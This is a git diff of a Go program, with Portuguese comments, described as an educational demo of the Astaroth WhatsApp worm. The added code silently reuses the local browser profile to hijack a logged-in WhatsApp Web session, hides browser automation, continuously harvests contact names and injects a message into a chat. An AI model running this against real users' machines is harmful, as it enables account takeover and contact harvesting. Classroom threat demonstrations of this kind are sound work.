@@ -2,7 +2,13 @@ package main
 
 import (
 	"fmt"
+	"os"
+	"path/filepath"
+	"strings"
+	"sync"
+	"syscall"
 	"time"
+	"unsafe"
 
 	"github.com/go-rod/rod"
 	"github.com/go-rod/rod/lib/input"
@@ -10,108 +16,223 @@ import (
 )
 
 /*
-WhatsApp Automation POC - Versão Educacional (Go)
-------------------------------------------------
-Este script demonstra a automação do WhatsApp Web em Go usando a biblioteca Rod.
-Objetivo: Prova de Conceito (POC) restrita para fins didáticos.
+WhatsApp Automation POC - Versão Educacional (Go) - FEBRABAN Demo
+-----------------------------------------------------------------
+Demonstra as capacidades wormable do Astaroth:
+1. AUTO-DETECÇÃO do perfil do Chrome (Session Hijacking)
+2. COLETA EM TEMPO REAL de contatos via Goroutines
+3. POPUP VISUAL (Windows MessageBox) para impacto na plateia
 
-RESTRIÇÕES:
-1. Sem C2 ou conexões externas.
-2. Limite de 5 contatos.
-3. Demonstração de injeção de mensagem segura.
+RESTRIÇÕES DE SEGURANÇA:
+- Sem C2 ou conexões externas.
+- Sem propagação automática.
 */
 
 const (
-	WhatsAppURL       = "https://web.whatsapp.com"
-	MaxContactsToList = 5
-	TestMessage       = "POV: Demonstração de automação em Go para aula de Cibersegurança."
+	WhatsAppURL = "https://web.whatsapp.com"
+	TestMessage = "POC: Demonstração de automação em Go para aula de Cibersegurança."
 )
 
+// --- Windows API para MessageBox ---
+var (
+	user32         = syscall.NewLazyDLL("user32.dll")
+	procMessageBox = user32.NewProc("MessageBoxW")
+)
+
+const (
+	MB_OK              = 0x00000000
+	MB_ICONWARNING     = 0x00000030
+	MB_ICONINFORMATION = 0x00000040
+	MB_TOPMOST         = 0x00040000
+)
+
+func messageBox(title, text string, flags uintptr) {
+	titlePtr, _ := syscall.UTF16PtrFromString(title)
+	textPtr, _ := syscall.UTF16PtrFromString(text)
+	procMessageBox.Call(
+		0,
+		uintptr(unsafe.Pointer(textPtr)),
+		uintptr(unsafe.Pointer(titlePtr)),
+		flags,
+	)
+}
+
+// --- Auto-detecção do Perfil do Chrome ---
+func findChromeProfile() string {
+	localAppData := os.Getenv("LOCALAPPDATA")
+	if localAppData == "" {
+		return ""
+	}
+
+	// Caminhos comuns para perfis de navegadores Chromium
+	candidates := []string{
+		filepath.Join(localAppData, "Google", "Chrome", "User Data"),
+		filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
+		filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
+	}
+
+	for _, path := range candidates {
+		if info, err := os.Stat(path); err == nil && info.IsDir() {
+			fmt.Printf("[+] Perfil encontrado: %s\n", path)
+			return path
+		}
+	}
+	return ""
+}
+
 func main() {
-	fmt.Println("[*] Iniciando POC de automação WhatsApp em Go...")
+	fmt.Println("╔══════════════════════════════════════════════════════╗")
+	fmt.Println("║   Astaroth WhatsApp Worm - POC Educacional (Go)    ║")
+	fmt.Println("║   FEBRABAN - Análise de Ameaças Cibernéticas       ║")
+	fmt.Println("╚══════════════════════════════════════════════════════╝")
+	fmt.Println()
 
-	// Configura o navegador
-	// O Rod permite controlar o navegador via DevTools Protocol (CDP)
+	// ETAPA 1: Auto-detecção do perfil do navegador
+	fmt.Println("[1/4] Buscando perfil do navegador no sistema...")
+	profilePath := findChromeProfile()
+
 	l := launcher.New().
-		Headless(false). // Deixa o navegador visível para o aluno
-		Devtools(true).
-		Leakless(false) // DESATIVADO: Para evitar bloqueio de antivírus
+		Headless(false).
+		Leakless(false).
+		Set("disable-blink-features", "AutomationControlled")
 
-	/*
-	   DICA PARA AULA (Sessão Logada / Session Hijacking):
-	   - Para usar sua sessão real do Chrome (e pular o QR Code), descomente a linha abaixo
-	     e altere 'SeuUsuario' para o nome do seu usuário Windows.
-	   - IMPORTANTE: O Chrome deve estar COMPLETAMENTE FECHADO antes de rodar o script.
-	*/
-	// l.UserDataDir("C:\\Users\\SeuUsuario\\AppData\\Local\\Google\\Chrome\\User Data")
+	if profilePath != "" {
+		fmt.Printf("[+] SESSION HIJACK: Usando perfil existente para pular autenticação!\n")
+		l.UserDataDir(profilePath)
+	} else {
+		fmt.Println("[!] Nenhum perfil encontrado. Será necessário escanear o QR Code.")
+	}
 
 	url := l.MustLaunch()
-
-	// Inicializa o browser
 	browser := rod.New().ControlURL(url).MustConnect()
 	defer browser.MustClose()
 
-	// Abre o WhatsApp Web
+	// ETAPA 2: Abrir WhatsApp Web
+	fmt.Println("[2/4] Abrindo WhatsApp Web...")
 	page := browser.MustPage(WhatsAppURL)
 
-	fmt.Println("[!] Por favor, escaneie o QR Code no navegador (ou use a sessão logada)...")
+	if profilePath == "" {
+		fmt.Println("[!] Escaneie o QR Code no navegador...")
+	} else {
+		fmt.Println("[*] Aguardando carregamento da sessão sequestrada...")
+	}
 
-	// Aguarda o login detectando a lista de conversas
 	page.MustElement("[data-testid='chat-list']").MustWaitVisible()
-	fmt.Println("[+] Login detectado com sucesso!")
-
-	// Pequena pausa para garantir carregamento total
+	fmt.Println("[+] WhatsApp Web carregado com sucesso!")
 	time.Sleep(2 * time.Second)
 
-	// --- INÍCIO DA CAPACIDADE REAL-TIME (WORM-LIKE) ---
-	fmt.Println("[*] Iniciando monitoramento em tempo real (Goroutines)...")
-	seenNames := make(map[string]bool)
+	// ETAPA 3: Coleta de contatos em tempo real
+	fmt.Println("[3/4] Iniciando coleta de contatos em tempo real...")
 
-	// Coleta inicial para não repetir o que já está na tela
+	var mu sync.Mutex
+	collectedContacts := []string{}
+
+	// Coleta inicial
 	initialElements := page.MustElements("span[title]")
 	for _, el := range initialElements {
 		name := el.MustText()
-		if name != "" {
-			seenNames[name] = true
+		if name != "" && len(name) > 1 {
+			mu.Lock()
+			collectedContacts = append(collectedContacts, name)
+			mu.Unlock()
+		}
+		if len(collectedContacts) >= 10 {
+			break
 		}
 	}
 
-	// Goroutine que monitora novos contatos em segundo plano
-	go func() {
-		for {
-			time.Sleep(3 * time.Second) // Escaneia a cada 3 segundos
+	// Mostra popup com os contatos coletados
+	if len(collectedContacts) > 0 {
+		popupText := fmt.Sprintf(
+			"⚠️ SESSÃO WHATSAPP COMPROMETIDA!\n\n"+
+				"O malware conseguiu acessar sua conta sem senha.\n\n"+
+				"Contatos coletados em tempo real:\n"+
+				"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
+				"%s\n"+
+				"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
+				"Total: %d contatos expostos.\n\n"+
+				"Em um ataque real, TODOS os contatos\n"+
+				"receberiam links maliciosos agora.",
+			formatContacts(collectedContacts),
+			len(collectedContacts),
+		)
 
+		// Exibe o popup em uma goroutine para não travar o console
+		go messageBox(
+			"🔴 Astaroth POC - Sessão Sequestrada",
+			popupText,
+			MB_ICONWARNING|MB_TOPMOST,
+		)
+
+		fmt.Println("\n[!!] POPUP EXIBIDO PARA A PLATEIA!")
+		fmt.Println("[*] Contatos coletados:")
+		for i, name := range collectedContacts {
+			fmt.Printf("    %d. %s\n", i+1, name)
+		}
+	}
+
+	// Goroutine de monitoramento contínuo
+	go func() {
+		seen := make(map[string]bool)
+		for _, n := range collectedContacts {
+			seen[n] = true
+		}
+
+		for {
+			time.Sleep(3 * time.Second)
 			elements := page.MustElements("span[title]")
 			for _, el := range elements {
 				name, err := el.Text()
-				if err != nil || name == "" {
+				if err != nil || name == "" || len(name) <= 1 {
 					continue
 				}
-
-				if !seenNames[name] {
-					seenNames[name] = true
-					fmt.Printf("\a\n[REAL-TIME] Novo contato/atividade detectada: %s\n", name)
-					fmt.Print("[!] Pressione ENTER para simular injeção no chat selecionado...")
+				if !seen[name] {
+					seen[name] = true
+					mu.Lock()
+					collectedContacts = append(collectedContacts, name)
+					mu.Unlock()
+					fmt.Printf("\a[REAL-TIME] Novo contato detectado: %s (Total: %d)\n", name, len(collectedContacts))
 				}
 			}
 		}
 	}()
-	// --- FIM DA CAPACIDADE REAL-TIME ---
 
-	// Demonstração de injeção de mensagem
-	fmt.Println("\n[!] Demonstração: Selecione um chat no navegador e pressione ENTER aqui para simular a injeção.")
-	fmt.Print("[-] (O monitoramento continua rodando em segundo plano enquanto você decide...)\n")
+	// ETAPA 4: Demonstração de injeção
+	fmt.Println("\n[4/4] Selecione um chat no navegador e pressione ENTER para demonstrar a injeção...")
+	fmt.Println("      (O monitoramento continua em segundo plano...)")
 
 	var inputStr string
 	fmt.Scanln(&inputStr)
 
-	// Busca a caixa de texto (contenteditable)
 	chatBox := page.MustElement("div[contenteditable='true'][data-tab='10']")
 	chatBox.MustClick().MustInput(TestMessage)
-
 	chatBox.MustType(input.Enter)
 
+	// Popup final
+	go messageBox(
+		"✅ Astaroth POC - Injeção Concluída",
+		fmt.Sprintf(
+			"Mensagem enviada com sucesso!\n\n"+
+				"Conteúdo: \"%s\"\n\n"+
+				"Em um cenário real, essa mensagem\n"+
+				"conteria um link para o próximo\n"+
+				"estágio do malware (downloader).\n\n"+
+				"Total de contatos coletados: %d",
+			TestMessage,
+			len(collectedContacts),
+		),
+		MB_ICONINFORMATION|MB_TOPMOST,
+	)
+
 	fmt.Printf("[+] Mensagem injetada: %s\n", TestMessage)
-	fmt.Println("[*] POC concluída. O navegador será fechado em 5 segundos.")
-	time.Sleep(5 * time.Second)
+	fmt.Println("[*] POC concluída. Pressione ENTER para fechar.")
+	fmt.Scanln(&inputStr)
+}
+
+func formatContacts(contacts []string) string {
+	var lines []string
+	for i, name := range contacts {
+		lines = append(lines, fmt.Sprintf("  %d. %s", i+1, name))
+	}
+	return strings.Join(lines, "\n")
 }
